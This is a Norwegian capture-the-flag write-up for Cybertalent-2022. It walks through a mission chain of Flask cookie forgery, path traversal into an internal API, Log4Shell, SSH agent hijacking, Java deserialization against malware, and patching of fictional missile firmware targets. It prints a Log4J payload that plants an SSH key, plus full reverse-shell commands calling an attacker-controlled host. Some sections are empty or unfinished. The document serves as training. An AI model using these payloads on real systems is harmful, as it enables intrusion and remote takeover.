# Cybertalent-2022

Cybertalent er 


---

## 2_01 - pcap_fil

Når vi åpner PCAP-filen så er det en HTTP pakke som skiller seg ut:

```text
GET / HTTP/1.1
Host: pwr-07-ws-caf5db
Accept: */*
X-Flag: caf5db3e4479b9c3dcb91e43ef9aa497
User-Agent: ${jndi:ldap://10.0.30.98:1389/Basic/Command/Base64/ZWNobyBzc2gtZWQyNTUxOSBBQUFBQzNOemFDMWxaREkxTlRFNUFBQUFJTVRnYnlrZW1wZEFaNEZhaHpMUit0c2NrdFNsaUt0RWR3Wk9sWllXQkhxQyA%2bPiAuc3NoL2F1dGhvcml6ZWRfa2V5cw==}
```

Den inneholder både et flagg og en indikator på en utnyttelse av en Log4J-svakhet. Vi kommer tilbake til sistnevnte på 2.06.

```text
Kategori: 2. Oppdrag
Oppgave:  2.01_pcap
Svar:     caf5db3e4479b9c3dcb91e43ef9aa497
Poeng:    10

Gratulerer, korrekt svar!
```

---

## 2.02_anvilnotes

INTREP gir oss en pekepinne mot en nettside som kan nås på ANVILNOTES.CYBERTALENT.NO.
Dette er tilsynelatende en helt vanlig nettside hvor man kan lage bruker, logge inn og lagre notater i skyen.

```text
Kategori: 2. Oppdrag
Oppgave:  2.02_anvilnotes
Svar:     4aee8b5ccff539d35e7c8d6a1d749e1b
Poeng:    10

Admin sine notater, som han laget før id ble randomisert...
Gir dette noen hint til hvordan du kan få mer tilgang?
```

---

## 2.03_anvilnotes_admin

I notatene til admin står følgende:
`☐ Secure flask token using military grade encryptions that can't be unsigned using open software.`

Basert på det, så googlet jeg følgende: `flask token exploit github`.
Da fikk jeg opp denne som fjerdevalg: https://github.com/Paradoxis/Flask-Unsign

Bruken av verktøyet er ganske rett frem, og hvordan/hvorfor det funker står best forklart på GitHub'en.

```
pip3 install flask-unsign[wordlist]
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6ImEifQ.Y7HYAw.1tPvb-GFYM6W4EWgbaJELRAZy7k"
[*] Session decodes to: {'username': 'a'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
[*] Attempted (2560): /-W%/egister your app with Twi
[*] Attempted (4224): 5#y2LF4Q8z8a52f30af11409c74288
[*] Attempted (31104): -----BEGIN PRIVATE KEY-----S_K
[+] Found secret key after 35712 attemptsYRjlMjM1k45F
'This is an UNSECURE Secret. CHANGE THIS for production environments.'
```

Nå som vi har hemmeligheten som ble brukt for å signere JWT så kan vi signere vår egen hvor vi er admin:

```
flask-unsign --cookie '{"username": "admin"}' --secret "This is an UNSECURE Secret. CHANGE THIS for production environments." --sign
eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7HcuQ.fIhMwTA2wkD3L0lphwKfic0mKqA
```
Vi kan da bytte ut vår JWT med overnevnte og navigere til https://anvilnotes.cybertalent.no/notes for å motta neste flagg.

```text
Kategori: 2. Oppdrag
Oppgave:  2.03_anvilnotes_admin
Svar:     071f24b786f392f3657fe7bbf5491e80
Poeng:    10

Som admin har du kanskje tilgang til mer funksjonalitet?
```

---

## 2.04_anvilnotes_password

Som admin har vi nå tilgang til "Save as PDF"-funksjonaliteten.

Jeg brukte Burp Suite for å inspisere nettverkstrafikken, og lærte at /genpdf endepunktet mottok en notat-ID via `id`-parameteret, og returnerte en PDF ved å bruke HTML-til-PDF programvaren `Werkzeug/2.2.2`.
Werkzeug er kjent for å være sårbar for Server Side Template Injection tidligere, men jeg klarte ikke å utnytte dette. Jeg kikket etter Local File Inclusion via `id`-parameteret, og fant ut at `id=../../` avslører et internt API:

```xml
{
    "definitions": {},
    "info": {
        "title": "Cool product name",
        "version": "0.0.0"
    },
    "paths": {
        "/api/decrypt": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            },
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            }
        },
        "/api/encrypt": {
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "body",
                        "name": "data",
                        "required": true,
                        "type": "string"
                    }
                ],
                "produces": [
                    "hex string"
                ],
                "responses": {},
                "summary": "Encrypts data with secret internal key"
            }
        },
        "/api/user/{user}": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "path",
                        "name": "<username>",
                        "required": true,
                        "type": "path"
                    }
                ],
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "Get information from the database on a user. example: /api/user/bob"
            }
        },
        "/api/users": {
            "get": {
                "description": "",
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "List all users from database."
            }
        }
    },
    "swagger": "2.0"
}
```

Jeg brukte da Repeater-funksjonaliteten i Burp for å utforske API'et:
```
>>> id=../users
["a","admin","Benjamin","Brian","Cynthia","Frank","George","Henry","Jason","Julia","Karen","Laura","Marilyn","Mark","Mary","Olivia","oper","Richard","Russell","Samuel","Sharon","Stephen","Theresa"]

>>> id=../user/oper
{"password":"83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048","username":"oper"}
```

Passordet ser ikke ut til å passe noe slags hash-format som jeg er bekjent, og hvis man sammenligner den med de andre brukerne så er lengden varierende.
Det vil da hinte til at det er kryptert, ikke hashet.

API'et har dekrypteringsfunksjonalitet, så vi kan benytte det i henhold til beskrivelsen som ble gitt:

```
>>> id=../decrypt?data=83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048
FLAGG: ed9e224f5a359543420928d1ed1a8ca8
```

Ser ut som om passordet til `oper` er `FLAGG: ed9e224f5a359543420928d1ed1a8ca8`. Det er beleilig.

```text
Kategori: 2. Oppdrag
Oppgave:  2.04_anvilnotes_password
Svar:     ed9e224f5a359543420928d1ed1a8ca8
Poeng:    10

Hvis aktøren har benyttet denne tjenesten finner vi kanskje noen interessante notater.
```

---

## 2.05_anvilnotes_source

Hvis vi logger på med brukernavn og passord nevnt ovenfor så finner vi to notater:

```
Backup of client source code	
Backup of server source code
```

Flagget ligger i notatene, sammen med den Base-64-kodet kildekoden til C2-klienten/-serveren.
Disse kommer vi tilbake til for 2.09.

```text
Kategori: 2. Oppdrag
Oppgave:  2.05_anvilnotes_source
Svar:     eacad6dfaadb1b0420dc17b6560b89de
Poeng:    10

Dette så interessant ut!
En samarbeidende tjeneste i Pseudova vurderer at dette meget sannsynlig er kildekoden for skadevaren benyttet i angrepene mot kraftverket deres.
```

---

## 2.06_pwr-ws-caf5db

En rask nmap skann av subnettet avslører at serveren med Log4J-sårbarheten fortsatt er tilgjengelig:

```bash
>>> nmap -sn 10.0.236.101/27
Nmap scan report for 0e7e17e3605aa2385b923dbd549531e4_pwr-ws-caf5db.1.4gpt2qoq7daix109e09sese50.0e7e17e3605aa2385b923dbd549531e4_backend (10.0.236.102)
Host is up (0.0076s latency).
```

https://github.com/zzwlpx/JNDIExploit
https://github.com/black9/Log4shell_JNDIExploit

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.69.36 &
nc -lvnp 4444
curl pwr-ws-caf5db -A '${jndi:ldap://10.0.69.36:1389/Basic/ReverseShell/10.0.69.36/4444}'
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.06_pwr-ws-caf5db
Svar:     74320a680cc9edc8d1f7a9a4a5c613dc
Poeng:    10

Det later til at skadevaren fortsatt kjører. Finn flere spor etter aktøren, og søk å skaffe aksess videre inn i infrastrukturen deres.

Brukeren har også privatnøkkel for ssh-tilgang til sin egen maskin. Jeg legger en kopi i oppdragsmappen din for lettere tilgang senere.

Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db
```

---

## 2.07_shady-aggregator

When listing the processes using `ps -aux`, we can see an active SSH connection:
`user         428  0.0  0.0   9100  1616 ?        Ss    2022   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_`

```
>>> ls -la /tmp/ssh-njl06sp7u2/agent.203 
srwxr-xr-x 1 user user 0 Dec 31 22:33 /tmp/ssh-njl06sp7u2/agent.203=
```

```
SSH_AUTH_SOCK=/tmp/ssh-njl06sp7u2/agent.203 ssh archive@shady-aggregator.utl
```


```text
Kategori: 2. Oppdrag
Oppgave:  2.07_shady-aggregator
Svar:     8f1e081e605843164b5efc848c12696a
Poeng:    10

Utmerket! Denne maskinen administrerer et botnett.

Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.
```

---

## 2.08_client_list

On `pwr-ws-caf5db` we could see that there was an active c2 running. Inspecting `/tmp/.tmp/`, we can see some files:

```text
-rw-r--r-- 1 user user 11258 Dec 18 22:02 .client
-rw-r--r-- 1 user user   202 Jan  1 22:43 .config
-rw-r--r-- 1 user user    22 Jan  1 22:43 .output
```

Running `strings /tmp/.tmp/.config` a suspicious looking URL:
`http://shady-aggregator.utl/f52e6101/`

When running a directory scan on the URL we can see that /list is valid.

```
curl http://shady-aggregator.utl/f52e6101/list

ID               | NAME                             | LAST CHECKIN
-----------------+----------------------------------+--------------------
42FD29AED93B779C | pwr-ws-caf5db                    | 2023-01-01 23:45:02
DEADBEEFDEADBEEF | test-3                           | 2023-01-01 23:45:01
18F53CE5F533ACF7 | aurum                            | 2023-01-01 23:44:37
FLAGG            | 260c54fac22eb752739f2978fff9e021 | 2022-11-30 17:48:21
6ED230A80172B12E | pwr-ws-72fed1                    | 2022-11-16 11:00:32
F7D79C0F8995E423 | pwr-ws-64ca70                    | 2022-11-07 09:07:29
58A5FCF9FB1712B7 | pwr-ws-6d5602                    | 2022-06-30 01:47:58
93B58D54A5DB772A | pwr-ws-b5747c                    | 2022-06-11 17:25:14
CAFEBABECAFEBABE | test-2                           | 2022-02-23 08:06:40
46E894E2BEC4BD46 | pwr-ws-a8a1ce                    | 2022-02-06 22:53:02
14B6A84F08AC6887 | pwr-ws-e3fb32                    | 2022-01-27 17:24:04
DEADC0DEDEADC0DE | test-1                           | 2021-12-20 12:33:20
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.08_client_list
Svar:     260c54fac22eb752739f2978fff9e021
Poeng:    10

En liste over alle de infiserte klientene deres?

Den test-instansen som fortsatt sjekker inn så spennende ut...
```

---

## 2.09_cloud-hq

Nå har vi tilgang til både archive@shady-aggregator og kildekoden for skadevaren som er i bruk. Scoreboard-teksten til 2.08 hinter mot den test-3 instansen som sjekker inn hvert 10. sekund.

Det mest logiske er at det er en sårbarhet i skadevaren som vil gi oss tilgang til de som opererer skadevaren.
Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til c2-brukeren på shady-aggregator, som var et flagg i umulig-kategorien. Det var gjennom en race condition, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).

Men selv tilgang til brukeren som kjørte serveren var ikke det som måtte til får å få tilgang til skurkene. Hver en kommando som blir lastet opp og ned går gjennom ECDSA signatursjekk, og implementasjonen virket nokså plettfri både på serveren og klienten i mine øyne.

Etter mye leting på nettet kom jeg over en sårbarhetskategori som heter Java Deserialization. Etter mange timers lesing gjennom slides og whitepapers på [denne](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview) GitHub'en så forstod litt hvordan sårbarheten fungerte, og hvordan den kunne anvendes i denne situasjonen.

I Config.java er det en `readObject()` funksjon som håndterer hvordan et Config-objekt skal leses inn.
I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis tiden er inne. Dette skjer da altså før noe som helst verifikasjon gjennom ECDSA.

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    id = ois.readUTF();
    sleepDuration = ois.readInt();
    serverURL = ois.readUTF();
    pendingCommands = new ArrayList<Command>();
    Instant now = Instant.now();
    int pendingCommandsSize = ois.readInt();
    for (int i = 0; i < pendingCommandsSize; i++) {
        Command c = (Command) ois.readObject();
        if (c.runAfter.isBefore(now))
            c.execute(System.out, this);
        else
            pendingCommands.add(c);
    }
}
```

Klienten mottar kommandoer gjennom `checkInWithC2()` funksjonen til `Client.java`, mer spesifikt disse to linjene:

```java
ObjectInputStream in = new ObjectInputStream(conn.getInputStream());
Command c = (Command) in.readObject();
```

Selv om det mottatte objektet blir kastet til et `Command` object, så vil `readObject()` bli eksekvert før dette.
Det spiller da ingen rolle om denne kastingen feiler, vi bryr oss bare om `readObject()`.

Java deserializing on the Config object equals RCE.

```text
Kategori: 2. Oppdrag
Oppgave:  2.09_cloud-hq
Svar:     80e125e2403402c9486c94eb3b276482
Poeng:    10

Det er noe veldig tilfredstillende med å utnytte sårbarheter i skadevare.

Dette ser ut som operatøren bak angrepet mot kraftverket. Jeg legger ssh-nøkkelen hans i oppdragsmappen din mens du går gjennom koden som ligger her.

Ny fil: /home/login/2_oppdrag/sshkey_cloud-hq
```

---

## 2.10_infrastruktur


```text
Kategori: 2. Oppdrag
Oppgave:  2.10_infrastruktur
Svar:     c4381f44298bb0dede6c185dc2406a40
Poeng:    10

Vi har nå god kontroll på Utlandias infrastruktur for cyberoperasjoner.

Vi mangler fortsatt informasjon om det gamle regimets planer. Informasjonen du har samlet inn vil bli overlevert til våre analytikere som vil sammenstille en rapport. Rapporten vil legges i oppdragsmappen din på corax så snart det lar seg gjøre.

Forbered for fremtidige operasjoner og avvent ytterligere ordre.

Ny fil: /home/login/2_oppdrag/INTREP-2.txt
```

---

## 2.11_aurum_shell

Vi bruker samme exploit som fra 2.09, men bytter ut ID'en til aurum sin.
Flagget ligger godt synlig i `/home/user/FLAG`.

```text
Kategori: 2. Oppdrag
Oppgave:  2.11_aurum_shell
Svar:     4ad7dab1e6231e8903985e5ea70cf4dc
Poeng:    3

Hva brukes denne maskinen til?

Ny fil: /home/login/2_oppdrag/sshkey_aurum
```

---

## 2.12_missile_targets

```text
Oppgave:  2.12_missile_targets
Svar:     bc23d07612ac5bb9aa1b0a4e612ff275
Poeng:    3

Bra jobba! Dette må være kontrollsystemet til missilene. Målparametrene er allerde lagt inn og sikter på mange vestlige byer!
Dette er viktig informasjon som vi har levert videre til våre oppdragsgivere. Analytikerene våre har plottet målene for deg, sjekk oppdragsmappen.
Som du forstår er det ekstremt viktig å forhindre dette!

Ny fil: /home/login/2_oppdrag/worst_case_scenario.jpg
```
![Worst case scenario](images/worst_case_scenario.jpg)

---

## 2.13_findflag




```C
input = read(*(_session + 1), &read_buf, 1);
if (input == 1) {
    _history.0 = read_buf | _history.0 << 8;
    if (_history.0 == 0x726f6f646b636162) {
        **_session = **_session ^ 2;
}
```

Den leser en enkelt byte med data fra `read()`, og lagrer den i en buffer kalt `read_buf`. 
Deretter utfører den en bitvis venstre skyving på `_history.0` og lagrer resultatet tilbake i `_history.0`, før den ORer den med `read_buf`. Change this #######
Lettere sagt: Opp til 8 av bokstavene vi skriver inn blir lagret i `_history.0`.

`0x726f6f646b636162` er hex for `roodkcab`, som er backdoor baklengs.
Når `_history` innheolder den verdien, så blir privilegiet vår forhøyet til `Developer`.

Nå som vi er `Developer` så kan vi rename brukeren vår. Grunnet feil i programvare (som vil ta litt for mye tid å forklare), så får vi `SYSTEM` privilegier om vi kaller oss `!`.

Vi er nå priviligert nok til å kjøre programmer, og når vi kjører `findflag.prg` får vi opp dette flotte bildet:

![2.13_flag](images/2.13_flag.png)

```
Kategori: 2. Oppdrag
Oppgave:  2.13_findflag
Svar:     bc05429e668f76f0cb22b53ca900e447
Poeng:    4

Herlig! Vi har nå lov til å kjøre programmer. Kan du bruke dette til noe?
```

---

## 2.14_multiplier

Koden er basert på:
https://asecuritysite.com/ecdsa/ecd5

```text
Kategori: 2. Oppdrag
Oppgave:  2.14_multiplier
Svar:     114798114433974422739242357806023105894899569106244681546807278823326360043821
Poeng:    5

Dette ser ut til å være privatnøkkelen som de bruker i ECDSA-signeringen sin. Som det kjente ordtaket går -- "Never roll your own crypto". La oss håpe denne nøkkelen kan brukes til noe nyttig :)
```

---

## 2.15_firmware_staged

```text
Kategori: 2. Oppdrag
Oppgave:  2.15_firmware_staged
Svar:     7f34ada436059e84fea23eb48c91024c9203638b
Poeng:    5

Wow! Firmware staged for flash når ubåten dykker opp! Oppdragsgiver ønsker at vi skal manipulere målkoordinatene til å treffe et trygt sted (24.1851, -43.3704). Klarer du dette? Analytikerene våre indikerer at ubåt nr. 1 sannsynligvis vil dykke opp i Biscayabukta, ubåt nr. 2 mellom Island og de Britiske øyer, ubåt nr. 3 ca. 100-200 nm sør/sør-øst for Italia, ubåt nr. 4 ca. 300-500 nm sør/sør-vest for Irland, og ubåt nr. 5 ca. 200-400 nm vest for Portugal. Bruk denne informasjonen for å regne ut de parametere du trenger.
Siden alle missilene i hver ubåt skal til samme mål, må firmware være identisk for hvert missil per ubåt.
```

---

## 2.16-20_submarine_0-4

Her ble det litt vanskelig.

Jeg brukte Ghidra for å reverse-engineere, da IDA kun støtter ARM om man er søkkrik.

I funksjonen `boot_banner()` kan vi se følgende:

```
printk("*** Booting Zephyr OS build zephyr-v3.2.0-2532-g5fab7a5173f6 ***\n");
```

Zephyr OS er et real-time operativsystem laget for innebygde enheter, og best av alt; det er open-source. Det er en stor hjelp å kunne slå opp definisjonene på datastrukturer, funksjoner og datatyper mens man reverse-engineerer.

Jeg brukte en god stund på å navigere den dekompilerte koden, og stirret på de forskjellige funksjonene til de ga noenlunde mening.

I "Memory Map"-visningen i Ghidra kan vi se et minnesegment som heter `.rocket_parameters`. 
Innunder denne finner vi etikettene `_tof` og `_target`. Disse navnene er vi bekjent med fra missil-listen vi fikk i [2.12_missile_targets](#212_missile_targets).
Begge disse to blir aksessert fra `armed_entry()`, mer spesifikt disse linjene av kode:

```C
zsl_vec_from_arr(&target, _target, param_3, 0, param_1);
DAT_200009b8 = target;
DAT_200009bc = PTR_target_vec_69c;
DAT_200009c4 = gc_init();
DAT_200009c4 = gc_set_initial_conditions(&DAT_200009b8, extraout_r1, _tof, DAT_00018f34);
```

Et raskt google-søk peker oss til [Zephyr Scientific Library](https://zephyrproject-rtos.github.io/zscilib/), som inneholder kildekoden for `zsl_vec_from_arr`, samt strukturen og datatypene:

```C
int zsl_vec_from_arr(struct zsl_vec* v, zsl_real_t* a)

struct zsl_vec {
    size_t sz;
    zsl_real_t *data;
};

typedef double zsl_real_t;
```



Brukte python til å unpacke bytene til 3 doubles:

```python
import array

_target = [0x84, 0x02, 0xf0, 0xe5, 0x7a, 0x40, 0x4e, 0x41, 0x9c, 0x1f, 0xed, 0xbd, 0x9b, 0xec, 0xbf, 0xc0, 0x74, 0xf1, 0x9c, 0xd6, 0xcd, 0x05, 0x53, 0x41]
print(*array.array('d', bytearray(_target)))
```

Det ga følgende output:

```text
3965173.7963870186 -8172.608366794793 4986679.353329051
```

Det ser akkurat ut som target-verdiene for SUB:1 MIS:1 som dukket opp i listen over missiler! Vi er på rett spor.

Jeg brukte litt tid på å lese meg opp på koordinatsystemer for å finne ut hva disse tallene betydde, og kom frem til det var ECEF (Earth-centered, Earth-fixed) koordinater vi jobbet med.
For å dobbeltsjekke dette prøvde jeg å konvertere fra ECEF til lat/lon ved hjelp av konvertere på nett, men de ga et resultat som virket feil.

Så da spørte jeg pent ChatGPT om å lage en til meg:

```python
import math

def ecef_vector_to_lat_lon(vector):
    x, y, z = vector
    lon = math.atan2(y, x)
    hyp = math.sqrt(x ** 2 + y ** 2)
    lat = math.atan2(z, hyp)

    lat = lat * 180 / math.pi
    lon = lon * 180 / math.pi

    return lat, lon

_target = [3965173.80, -8172.61, 4986679.35]
print(ecef_vector_to_lat_lon(_target))
```

Output:

```python
(51.50986495591076, -0.11809202349170798)
```

Plugger vi disse koordinatene inn i [Google Maps](https://www.google.no/maps/place/51%C2%B030'35.5%22N+0%C2%B007'05.1%22W/@51.5098683,-0.120286,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0xf5e2635478a5eaeb!8m2!3d51.509865!4d-0.118092) så havner vi midt i sentrum av London. Nice! 



Jeg brukte [Nvector](https://github.com/pbrod/Nvector) for å gjøre de geometriske kalkulasjonene. Lagde dette for å gjøre om lat/lon koordinatene vi fikk om til ECEF, for så å pakke de til rett dataformat:

```python
import nvector
import struct

target_coordinates = (24.1851, -43.3704)
sphere = nvector.FrameE(a=6371e3, f=0)

target = sphere.GeoPoint(latitude=target_coordinates[0], longitude=target_coordinates[1], z=0, degrees=True)
ecef_vectors = target.to_ecef_vector().pvector

print("Target ECEF vectors:", *ecef_vectors)
print("_target value:", struct.pack('d' * len(ecef_vectors), *ecef_vectors).hex())
```

Output:

```
Target ECEF vectors: [4224766.3303444] [-3991030.54681077] [2610108.35568405]
_target value: d55c2495bf1d50412de5fd45fb724ec10c0e872ddee94341
```

Planen nå var å:
* Patche bytene i `_target` ved hjelp av "Bytes"-visningen til Ghidra
* Lagre firmwaren og overføre den til aurum.
* Signere filen ved å bruke `signer` og `privkey.pem`
* Laste opp fila
* Lage shellcode som flashet ubåt 1 med vår nye firmware
* Utføre en simulering, og se hva som skjer







å regne ut distansen mellom hver ubåt og dens respektive missilers mål.

```text
Distance: 348395.48975179956 - Time of Flight: 500.0 - Distance/TOF: 696.7909795035991
Distance: 500263.3985159643 - Time of Flight: 600.0 - Distance/TOF: 833.7723308599404
Distance: 511762.1047280655 - Time of Flight: 600.0 - Distance/TOF: 852.9368412134424
Distance: 520499.4149202836 - Time of Flight: 900.0 - Distance/TOF: 578.3326832447596
Distance: 590144.6263528519 - Time of Flight: 600.0 - Distance/TOF: 983.5743772547531
Distance: 732878.7025049966 - Time of Flight: 1300.0 - Distance/TOF: 563.7528480807666
Distance: 808640.5369362447 - Time of Flight: 1080.0 - Distance/TOF: 748.7412379039303
Distance: 863068.4010189358 - Time of Flight: 1080.0 - Distance/TOF: 799.1374083508665
Distance: 933003.5862811609 - Time of Flight: 1080.0 - Distance/TOF: 863.8922095195935
Distance: 945357.6059941095 - Time of Flight: 1080.0 - Distance/TOF: 875.3311166612125
Distance: 964152.5410666476 - Time of Flight: 1080.0 - Distance/TOF: 892.73383432097
Distance: 966287.4969199213 - Time of Flight: 1000.0 - Distance/TOF: 966.2874969199213
Distance: 981188.6638837567 - Time of Flight: 1080.0 - Distance/TOF: 908.5080221145896
Distance: 1009708.3154344284 - Time of Flight: 1080.0 - Distance/TOF: 934.91510688373
Distance: 1012135.9835278065 - Time of Flight: 1000.0 - Distance/TOF: 1012.1359835278065
Distance: 1019896.8575486206 - Time of Flight: 1080.0 - Distance/TOF: 944.3489421746486
Distance: 1041037.6111341281 - Time of Flight: 1100.0 - Distance/TOF: 946.3978283037528
Distance: 1082799.317533042 - Time of Flight: 1100.0 - Distance/TOF: 984.3630159391291
Distance: 1150927.3278368798 - Time of Flight: 1300.0 - Distance/TOF: 885.3287137206768
Distance: 1170456.4550821886 - Time of Flight: 1300.0 - Distance/TOF: 900.3511192939912
Distance: 1209191.039503127 - Time of Flight: 1200.0 - Distance/TOF: 1007.6591995859393
Distance: 1217874.0369089686 - Time of Flight: 1100.0 - Distance/TOF: 1107.1582153717895
Distance: 1224359.5574722323 - Time of Flight: 1200.0 - Distance/TOF: 1020.2996312268602
Distance: 1246719.4941068373 - Time of Flight: 1500.0 - Distance/TOF: 831.1463294045582
Distance: 1266109.9669538387 - Time of Flight: 1400.0 - Distance/TOF: 904.3642621098847
Distance: 1293026.5173402096 - Time of Flight: 1200.0 - Distance/TOF: 1077.522097783508
Distance: 1311433.3252238766 - Time of Flight: 1000.0 - Distance/TOF: 1311.4333252238766
Distance: 1339603.8980102893 - Time of Flight: 1100.0 - Distance/TOF: 1217.8217254638994
Distance: 1351068.7739735628 - Time of Flight: 1600.0 - Distance/TOF: 844.4179837334767
Distance: 1405361.7044354093 - Time of Flight: 1100.0 - Distance/TOF: 1277.6015494867356
Distance: 1411325.99611136 - Time of Flight: 1100.0 - Distance/TOF: 1283.023632828509
Distance: 1450589.2628414233 - Time of Flight: 1200.0 - Distance/TOF: 1208.824385701186
Distance: 1453023.3903872136 - Time of Flight: 1700.0 - Distance/TOF: 854.7196414042432
Distance: 1468197.1626789959 - Time of Flight: 1300.0 - Distance/TOF: 1129.3824328299968
Distance: 1506467.74026547 - Time of Flight: 1100.0 - Distance/TOF: 1369.5161275140636
Distance: 1519089.0211525294 - Time of Flight: 1500.0 - Distance/TOF: 1012.7260141016862
Distance: 1565793.7530927446 - Time of Flight: 1500.0 - Distance/TOF: 1043.8625020618297
Distance: 1580386.814366429 - Time of Flight: 1500.0 - Distance/TOF: 1053.5912095776193
Distance: 1609795.4943599436 - Time of Flight: 1600.0 - Distance/TOF: 1006.1221839749647
Distance: 1641568.9514015021 - Time of Flight: 1700.0 - Distance/TOF: 965.62879494206
Distance: 1710921.043500996 - Time of Flight: 1700.0 - Distance/TOF: 1006.42414323588
Distance: 1732740.667998054 - Time of Flight: 1300.0 - Distance/TOF: 1332.87743692158
Distance: 1747809.0476979413 - Time of Flight: 1600.0 - Distance/TOF: 1092.3806548112134
Distance: 1772308.7041964093 - Time of Flight: 1300.0 - Distance/TOF: 1363.3143878433918
Distance: 1782415.0479200284 - Time of Flight: 1800.0 - Distance/TOF: 990.2305821777936
Distance: 1819740.3098170958 - Time of Flight: 1900.0 - Distance/TOF: 957.7580577984714
Distance: 1853500.774347373 - Time of Flight: 1900.0 - Distance/TOF: 975.5267233407227
Distance: 1889860.569262299 - Time of Flight: 2000.0 - Distance/TOF: 944.9302846311494
Distance: 1897069.5809633008 - Time of Flight: 1500.0 - Distance/TOF: 1264.7130539755337
Distance: 1912908.8580703784 - Time of Flight: 1800.0 - Distance/TOF: 1062.7271433724325
Distance: 1914674.369283808 - Time of Flight: 2000.0 - Distance/TOF: 957.337184641904
Distance: 1932985.6228606955 - Time of Flight: 1600.0 - Distance/TOF: 1208.1160142879346
Distance: 1946924.4505204486 - Time of Flight: 2000.0 - Distance/TOF: 973.4622252602243
Distance: 2007013.7951378133 - Time of Flight: 1550.0 - Distance/TOF: 1294.847609766331
Distance: 2033289.0976990887 - Time of Flight: 1900.0 - Distance/TOF: 1070.152156683731
Distance: 2082487.3067442677 - Time of Flight: 1800.0 - Distance/TOF: 1156.9373926357043
Distance: 2101044.0567982495 - Time of Flight: 1600.0 - Distance/TOF: 1313.152535498906
Distance: 2137414.664839351 - Time of Flight: 2000.0 - Distance/TOF: 1068.7073324196756
Distance: 2177246.8662748435 - Time of Flight: 1400.0 - Distance/TOF: 1555.1763330534595
Distance: 2204009.2435102407 - Time of Flight: 1500.0 - Distance/TOF: 1469.3394956734937
Distance: 2207768.402966359 - Time of Flight: 2000.0 - Distance/TOF: 1103.8842014831796
Distance: 2215078.945614269 - Time of Flight: 1400.0 - Distance/TOF: 1582.199246867335
Distance: 2231092.6606392763 - Time of Flight: 2000.0 - Distance/TOF: 1115.5463303196382
Distance: 2239277.0724439276 - Time of Flight: 1700.0 - Distance/TOF: 1317.2218073199574
Distance: 2257608.199286598 - Time of Flight: 1600.0 - Distance/TOF: 1411.0051245541235
Distance: 2266828.433244026 - Time of Flight: 1600.0 - Distance/TOF: 1416.767770777516
Distance: 2295831.850452401 - Time of Flight: 1700.0 - Distance/TOF: 1350.48932379553
Distance: 2299594.3277599183 - Time of Flight: 1600.0 - Distance/TOF: 1437.246454849949
Distance: 2329805.381936575 - Time of Flight: 2000.0 - Distance/TOF: 1164.9026909682875
Distance: 2330857.228655695 - Time of Flight: 2100.0 - Distance/TOF: 1109.932013645569
Distance: 2366856.8442280795 - Time of Flight: 1600.0 - Distance/TOF: 1479.2855276425498
Distance: 2558155.198729103 - Time of Flight: 1750.0 - Distance/TOF: 1461.8029707023445
Distance: 2672868.1646775766 - Time of Flight: 1800.0 - Distance/TOF: 1484.9267581542092
Distance: 2679267.842135778 - Time of Flight: 1800.0 - Distance/TOF: 1488.4821345198768
Distance: 2696890.090424191 - Time of Flight: 2000.0 - Distance/TOF: 1348.4450452120957
Distance: 2960229.4683541474 - Time of Flight: 2000.0 - Distance/TOF: 1480.1147341770736
Distance: 2962600.502655174 - Time of Flight: 2000.0 - Distance/TOF: 1481.3002513275871
Distance: 3064300.340851306 - Time of Flight: 2000.0 - Distance/TOF: 1532.150170425653
Distance: 3498845.2588418713 - Time of Flight: 2200.0 - Distance/TOF: 1590.384208564487
Distance: 3682334.5674927537 - Time of Flight: 2200.0 - Distance/TOF: 1673.7884397694336
```

Man kan se at relasjonen mellom flytiden og distansen blir i snitt høyere desto lengre distansen er. I tillegg ser vi at det er litt slingringsmonn i flytiden.
Basert på distansen som missilene måtte gå for å treffe midten av atlanterhavet så kom jeg frem til at `TOF ~= Distance / 1500`.

Etter å ha regnet det ut fikk jeg dette resultatet:

```text
Submarine 1 - Distance: 4148201.467647918 - Recommended _tof: 2800.0 (00e0a540)
Submarine 2 - Distance: 4740515.669383748 - Recommended _tof: 3200.0 (0000a940)
Submarine 3 - Distance: 6031013.339962457 - Recommended _tof: 4000.0 (0040af40)
Submarine 4 - Distance: 3509224.261450487 - Recommended _tof: 2300.0 (00f8a140)
Submarine 5 - Distance: 3177066.054664542 - Recommended _tof: 2100.0 (0068a040)
```

Hex-verdien i parantes er de rå bytene som _tof skal patches med.



```text
Kategori: 2. Oppdrag
Oppgave:  2.16_submarine_0
Svar:     4312ce7fbaea6a5587634a834afcb495
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```

---

